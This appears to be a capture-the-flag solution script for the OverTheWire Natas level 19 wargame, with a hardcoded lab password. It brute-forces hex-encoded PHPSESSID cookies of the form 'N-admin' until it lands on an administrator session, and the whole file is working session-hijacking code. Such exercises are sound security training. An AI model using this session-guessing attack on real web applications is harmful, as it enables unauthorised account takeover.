import requests

pattern = 'You are an admin. The credentials for the next level are'
natas19_username = 'natas19'
natas19_passwd = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
resID = ''
url = 'http://natas19.natas.labs.overthewire.org/'

for i in range(1, 1001):
    dt = str(i) + '-' + 'admin'
    dt = dt.encode('hex')
    res = requests.post(url, auth=(natas19_username, natas19_passwd), cookies=dict(PHPSESSID=dt))
    if pattern in res.text:
        print(str(i) + ': Session ' + dt + ' is good!')
        resID = dt 
        break
    else:
        print(str(i) + ' Session ' + dt + ' is bad!')
print('RESULT: Session ' + resID + '.')
